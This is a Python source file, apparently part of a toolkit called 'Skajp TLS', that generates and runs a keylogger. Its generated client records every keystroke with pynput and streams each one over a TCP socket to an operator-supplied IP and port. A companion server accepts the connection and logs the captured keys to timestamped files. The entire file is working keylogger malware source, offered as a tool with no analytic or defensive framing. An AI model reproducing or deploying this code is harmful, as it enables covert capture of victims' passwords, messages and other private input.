#!/usr/bin/env python3
#-*- coding: utf-8 -*-

#              This script was made for Skajp TLS
#              -~==============================~-
# Made by Skajp

def Keylogger():
    import socket, json, os, datetime, random
    def MakeClient(conip, conport):
        data = f"""# Made by Skajp
from pynput.keyboard import Key, Listener;import logging,socket,json,time;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);notcon = True
while notcon:
    try:s.connect((str('{conip}'), int({conport})));notcon=False;break
    except:time.sleep(10);pass
def rs(data):s.send(json.dumps(data).encode())
def on_press(key):rs(str(key))
with Listener(on_press=on_press) as listener:listener.join()
        """
        if os.path.exists(f"./misc/keylogger/clients/{filename}.py"):
            with open(f"./misc/keylogger/clients/{filename}.py", "w") as f:
                f.write(data)
                print(f"\033[1;90m Chat file created in './misc/keylogger/clients/{filename}.py'")
        else:
            lolec = open(f"./misc/keylogger/clients/{filename}.py", "x")
            with open(f"./misc/keylogger/clients/{filename}.py", "w") as f:
                f.write(data)
                print(f"\033[1;90m Chat file created in './misc/keylogger/clients/{filename}.py'")
        
    def Server(host, port):
        if not os.path.exists("./misc/keylogger/logs"):os.makedirs('misc/logs')

        def reliable_recv():
            data = ''
            while True:
                try:return json.loads(data + target.recv(1024).decode().rstrip())
                except ValueError:continue

        def target_communication():
            timen = datetime.datetime.now().strftime(r'%Hh-%Mm-%Ss_-_%d\%m\%Y')
            try:open(f"./misc/keylogger/logs/log_-_{timen}.txt", "x")
            except:pass
            with open(f"./misc/keylogger/logs/log_-_{timen}.txt", "a") as f:f.write(f"Generated by SkajpTLS\nListening IP: {lip}\nListening Port: {lport}\n\nIP: {tip}\nPort: {tport}\n\n")
            while True:
                result = reliable_recv()
                print(result)
                with open(f"./misc/keylogger/logs/log_-_{timen}.txt", "a") as f:f.write(f"{result}\n")

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((str(host), int(port)))
        server.listen()

        target, ip = server.accept()
        print(f" [+] Target Connected: {str(ip)} " )
        print(" [!] Keylogger started...\n")
        target_communication()

    def clear():os.system('cls' if os.name == 'nt' else 'clear')
    clear()

    def Menu():
        global lip, lport, tip, tport
        print(f"\n\033[1;90m This will start server and create client to './misc/keylogger/clients/'")
        print(f"\033[1;90m And save logs into './misc/keylogger/logs/'")

        lip = input("\n\033[1;93m Listening IP\033[1;90m > \033[1;37m")
        lport = input("\033[1;93m Listening PORT\033[1;90m > \033[1;37m")

        tip = input("\n\033[1;93m IP\033[1;90m > \033[1;37m")
        tport = input("\033[1;93m PORT\033[1;90m > \033[1;37m")


    Menu()
    clear()
    print(f"Listening on {lip} and port {lport}...")
    filename = input("\n\033[1;93m Filename of client \033[1;90m> \033[1;37m")
    if len(filename) < 1:filename = f'client{random.randrange(0000,9999)}'
    MakeClient(tip, tport)
    print("\n\n\033[1;90m To close server, close Skajp tls and open it again")
    Server(lip, lport)
